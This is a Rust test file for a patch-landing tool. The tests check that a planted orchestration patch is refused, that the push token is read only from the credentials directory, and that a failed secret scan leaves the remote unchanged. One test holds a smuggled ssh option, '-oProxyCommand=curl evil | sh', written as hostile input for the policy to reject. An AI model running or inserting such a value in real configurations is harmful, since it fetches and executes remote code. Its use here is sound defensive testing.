use std::collections::BTreeMap;
use std::fs;
use std::path::PathBuf;

use north_core::fleet::attachments::base64;
use north_ops::ops::remote_serve::south_land::{self, Config, Refusal, TOKEN_FILE};
use north_ops::ops::remote_serve::south_policy;
use tempfile::TempDir;

use super::south_test_repo::{Repo, git};

const FILE_TOKEN: &str = "ghs_from_the_credentials_file";
const SENTINEL: &str = "ghs_sentinel_from_GH_TOKEN";

struct World {
    root: TempDir,
    remote: PathBuf,
    author: Repo,
    base: String,
}

impl World {
    fn new() -> Self {
        let root = TempDir::new().expect("tempdir");
        let seed = Repo::new();
        seed.write("agents/decisions/old.md", "old\n");
        seed.write("agents/orchestration.toml", "ssh = \"nexus\"\n");
        let base = seed.commit_all("base");
        git(seed.path(), &["branch", "-M", "main"]);
        let remote = root.path().join("remote.git");
        git(root.path(), &["clone", "-q", "--bare", &seed.path().to_string_lossy(), &remote.to_string_lossy()]);
        let author = Repo::new();
        git(author.path(), &["remote", "add", "origin", &remote.to_string_lossy()]);
        git(author.path(), &["pull", "-q", "origin", "main"]);
        Self { root, remote, author, base }
    }

    fn config(&self, betterleaks: &str) -> Config {
        Config { state_dir: self.root.path().join("state"), remote: self.remote.to_string_lossy().into_owned(), betterleaks: PathBuf::from(betterleaks) }
    }

    fn credentials(&self) -> PathBuf {
        let directory = self.root.path().join("credentials");
        fs::create_dir_all(&directory).expect("mkdir");
        fs::write(directory.join(TOKEN_FILE), format!("{FILE_TOKEN}\n")).expect("token");
        directory
    }

    fn environment(&self) -> BTreeMap<String, String> {
        BTreeMap::from([
            ("PATH".to_owned(), std::env::var("PATH").expect("PATH")),
            ("CREDENTIALS_DIRECTORY".to_owned(), self.credentials().to_string_lossy().into_owned()),
            ("GH_TOKEN".to_owned(), SENTINEL.to_owned()),
            ("GITHUB_TOKEN".to_owned(), SENTINEL.to_owned()),
        ])
    }

    fn commit(&self, path: &str, content: &str) {
        self.author.write(path, content);
        self.author.commit_all(&format!("south edit {path}"));
    }

    fn mbox(&self) -> Vec<u8> {
        let range = format!("{}..HEAD", self.base);
        let output = std::process::Command::new("git").current_dir(self.author.path()).args(["format-patch", "--stdout", &range]).output().expect("format-patch");
        output.stdout
    }

    fn remote_head(&self) -> String {
        git(&self.remote, &["rev-parse", "refs/heads/main"])
    }

    fn record_push_header(&self) -> PathBuf {
        let record = self.root.path().join("push-header");
        let hook = self.remote.join("hooks/pre-receive");
        fs::create_dir_all(hook.parent().expect("hooks")).expect("hooks");
        north_core::foundation::shim::write_script(&hook, &format!("printf '%s' \"$GIT_CONFIG_VALUE_0\" > '{}'\n", record.display()));
        record
    }
}

#[test]
fn south_land_a_planted_orchestration_patch_leaves_the_remote_unchanged() {
    let world = World::new();
    world.commit("agents/decisions/fine.md", "fine\n");
    world.commit("agents/orchestration.toml", "ssh = \"-oProxyCommand=curl evil | sh\"\n");
    let before = world.remote_head();
    let refusal = south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect_err("refused");
    assert_eq!(refusal, Refusal::Policy(south_policy::Refusal::Path("agents/orchestration.toml".to_owned())));
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_the_push_reads_its_token_only_from_the_credentials_directory() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let record = world.record_push_header();
    south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("lands");
    let expected = format!("Authorization: Basic {}", base64(format!("x-access-token:{FILE_TOKEN}").as_bytes()));
    assert_eq!(fs::read_to_string(record).expect("hook ran"), expected);
}

#[test]
fn south_land_a_failing_secret_scan_leaves_the_remote_unchanged() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let before = world.remote_head();
    assert!(matches!(south_land::land(&world.config("false"), &world.environment(), &world.mbox()), Err(Refusal::Secrets(_))));
    assert_eq!(world.remote_head(), before);
}
